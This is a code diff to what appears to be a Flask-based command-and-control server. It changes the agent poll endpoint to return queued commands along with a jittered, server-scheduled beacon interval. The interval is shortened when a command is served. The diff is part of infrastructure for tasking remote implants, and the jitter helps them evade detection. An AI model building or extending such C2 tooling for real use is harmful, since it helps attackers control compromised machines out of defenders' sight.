@@ -13,6 +13,7 @@ import os
 
 from flask import Blueprint, jsonify, request
 
+from app.exec import beacon
 from app.state import BASE_DIR
 from app.services import c2 as c2svc
 
@@ -47,10 +48,12 @@ def c2_poll():
         return jsonify({'error': 'No uid provided'}), 400
 
     cmd = c2svc.poll(uid)
-    if cmd is not None:
-        return jsonify({'command': cmd})
 
-    return jsonify({'command': None})
+    # P15.4: server-driven beacon. Record the REAL arrival and hand the agent its
+    # next interval (jittered; interactive fast-path when a command was served).
+    interval = beacon.TRACKER.schedule(uid, interactive=cmd is not None)
+
+    return jsonify({'command': cmd, 'next_interval_ms': interval})
 
 
 @bp.route('/api/c2/response', methods=['POST'])
